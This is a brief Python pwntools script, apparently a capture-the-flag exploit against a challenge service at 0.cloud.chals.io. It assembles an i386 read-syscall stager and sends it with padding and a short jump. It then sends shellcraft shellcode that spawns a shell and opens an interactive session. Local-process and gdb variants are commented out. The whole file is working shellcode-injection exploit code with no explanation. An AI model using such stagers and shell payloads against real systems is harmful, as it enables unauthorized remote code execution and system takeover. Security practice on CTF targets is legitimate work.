from pwn import *

context.arch = "i386"

code = """
mov    al, 3
pop    ecx
xor    cl, cl
mov    dl, 0xff
int    0x80
"""

print(asm(code))
print(len(asm(code)))




io = remote("0.cloud.chals.io", "20922")
# io = process('./server.out')
# io = gdb.debug('./server.out', """
#     b *main
#     """)

io.sendline(b'A' * 7 + asm(code) + b'\xeb\x11')
io.sendline(b'A' * 0x10 + asm(shellcraft.sh()))
io.interactive()

